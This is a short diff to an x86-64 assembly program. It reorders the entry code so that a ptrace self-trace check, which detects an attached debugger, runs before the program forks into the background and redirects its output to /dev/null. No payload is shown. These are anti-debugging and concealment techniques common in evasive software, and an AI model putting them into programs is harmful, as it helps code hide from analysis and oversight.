@@ -24,26 +24,26 @@ section .text
     global _start
 
 _start:
-    mov rax, SYS_FORK
-    syscall
-
-    test rax, rax ;check error or parent
-    jnz safe_exit
-
     mov rax, SYS_PTRACE
     mov rdi, 0
     xor rsi, rsi
     xor rdx, rdx
     xor r10, r10
     syscall
-    test rax, rax
-    js safe_exit
+    cmp rax, 0
+    jl safe_exit
+
+    mov rax, SYS_FORK
+    syscall
+
+    test rax, rax ;check error or parent
+    jnz safe_exit
 
     call redirect_dev_null
 
     mov r12, rsp
     add r12, 8
-    
+
     push rdx
     push rbp           ; save the base pointer
     mov rbp, rsp       ; set the base pointer to the current stack pointer
